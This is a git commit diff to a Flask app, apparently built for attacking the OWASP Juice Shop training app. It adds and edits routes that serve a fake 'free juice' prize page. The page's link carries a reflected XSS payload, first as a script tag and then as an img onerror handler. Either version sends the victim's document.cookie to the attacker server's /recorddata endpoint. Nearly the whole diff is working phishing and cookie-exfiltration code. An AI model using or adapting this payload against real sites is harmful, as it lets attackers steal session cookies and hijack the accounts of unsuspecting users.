a6a0a0b9a38565048fe7ead2eacbf99d802f71d5
contini <sydney_elvis@yahoo.com.au>
2021-04-18 18:46:59 +1000

    Changed the XSS payload -- should work now for new juiceshop

--- app.py
+++ app.py
@@ -42,9 +42,16 @@ def whoami():
     return request.url_root
 
 
+@app.route('/oldfreejuice')
+def oldfreejuice():
+    xss='''<!DOCTYPE html> <html> <head> <style> body { background-color: #93B874; } h1 { background-color: orange; } </style> <title>Get a free juice!</title> </head> <body> <center> <h1>Winner!  Winner!</h1> <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''recorddata%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here</a> to claim!  </p> </center> </body> </html>
+'''
+    return xss
+
+
 @app.route('/freejuice')
 def freejuice():
-    xss='''<!DOCTYPE html> <html> <head> <style> body { background-color: #93B874; } h1 { background-color: orange; } </style> <title>Get a free juice!</title> </head> <body> <center> <h1>Winner!  Winner!</h1> <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3Cscript%3Evar+xsession%3D%22''' + request.url_root + '''recorddata%3F%22.concat%28document.cookie%29%3B+var+xhttp+%3D+new+XMLHttpRequest%28%29%3B+xhttp.open%28%22GET%22%2C+xsession%2C+true%29%3B+xhttp.send%28%29%3C%2Fscript%3E">click here</a> to claim!  </p> </center> </body> </html>
+    xss='''<!DOCTYPE html> <html> <head> <style> body { background-color: #93B874; } h1 { background-color: orange; } </style> <title>Get a free juice!</title> </head> <body> <center> <h1>Winner!  Winner!</h1> <p> Lucky winner!  You won a free juice from the Owasp Juice Shop!  Just <a href="https://juice-shop.herokuapp.com/#/search?q=%3Cimg+src%3Dx+onerror%3D%22javascript%3Avar+xmlHttp+%3D+new+XMLHttpRequest%28%29%3B+xmlHttp.open%28+%27GET%27%2C+%27''' + request.url_root + '''recorddata%3F%27%2Bdocument.cookie%2C+false+%29%3B+xmlHttp.send%28+null+%29%3B%22%3E">click here</a> to claim!  </p> </center> </body> </html>
 '''
     return xss
 
